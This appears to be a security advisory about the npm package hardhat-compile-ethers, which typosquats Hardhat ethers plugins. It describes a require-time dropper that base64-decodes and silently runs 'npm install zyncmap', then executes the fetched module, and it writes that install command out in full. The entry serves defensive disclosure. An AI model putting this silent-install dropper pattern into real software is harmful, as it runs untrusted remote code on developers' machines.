summary: hardhat-compile-ethers performs load-time silent npm install and execution of obfuscated dependency
details: On require(), dist/src/index.js base64-decodes a hidden shell command and silently runs `npm install zyncmap --no-save --silent --no-audit --no-fund`, then on process close requires the freshly fetched `zyncmap` module (name also base64-encoded) and invokes its `getPlugin()()` callback. Any code published under the `zyncmap` name therefore executes in the developer's environment as soon as the plugin is loaded by Hardhat. Both the shell command and the dependency name are stored as base64 string literals decoded at runtime, which evidences intent to evade detection. The package name mimics the legitimate `@nomicfoundation/hardhat-ethers` / `@nomiclabs/hardhat-ethers` plugins and declares the former as a peerDependency, luring Hardhat users into adding it to `hardhat.config` where the require-time dropper fires.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
